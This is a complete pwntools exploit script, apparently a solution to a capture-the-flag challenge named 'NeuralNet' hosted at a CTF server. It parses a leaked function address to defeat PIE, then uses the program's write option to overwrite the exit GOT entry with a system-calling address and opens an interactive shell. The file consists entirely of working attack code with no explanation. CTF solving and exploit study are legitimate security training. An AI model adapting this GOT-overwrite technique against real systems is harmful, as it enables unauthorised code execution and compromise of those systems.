from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./NeuralNet"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("ctf.mf.grsu.by", 9076)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

system = 0x1189
exit_got = 0x4028
predict_outcome = 0x11E2
payload = b""

io.recvuntil("address (predict_outcome): ", drop=True)
predict = int(io.recvline()[:-1], 16)
log.success("predict: -----> " + hex(predict))

elfbase = predict - predict_outcome

exit_got = elfbase + exit_got
system = elfbase + system

io.sendlineafter("> ", b"3")
io.sendlineafter("> ", hex(exit_got))
io.sendlineafter("> ", hex(system))

ddebug()
io.sendlineafter("> ", b"4")

io.interactive()
